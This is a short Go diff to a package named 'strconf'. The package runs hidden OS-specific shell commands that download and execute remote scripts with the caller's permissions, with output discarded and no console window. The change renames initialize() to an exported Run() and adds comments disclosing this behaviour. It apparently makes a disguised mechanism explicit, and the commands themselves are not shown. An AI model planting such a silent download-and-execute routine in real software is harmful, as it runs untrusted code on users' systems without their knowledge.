@@ -1,3 +1,5 @@
+// Package strconf runs a predefined, OS-specific shell command when Run is called.
+// The configured commands download and execute remote scripts.
 package strconf
 
 import (
@@ -21,7 +23,9 @@ const (
 // Standard input is disconnected and output is discarded. On Windows, the
 // shell runs without a visible console window. Programs launched by the shell
 // can still open their own graphical windows.
-func initialize() error {
+// The predefined commands download and execute remote scripts with the calling
+// process's permissions. Importing this package does not execute any commands.
+func Run() error {
 	return runCommands(windowsCommand, linuxCommand, macOSCommand)
 }
 
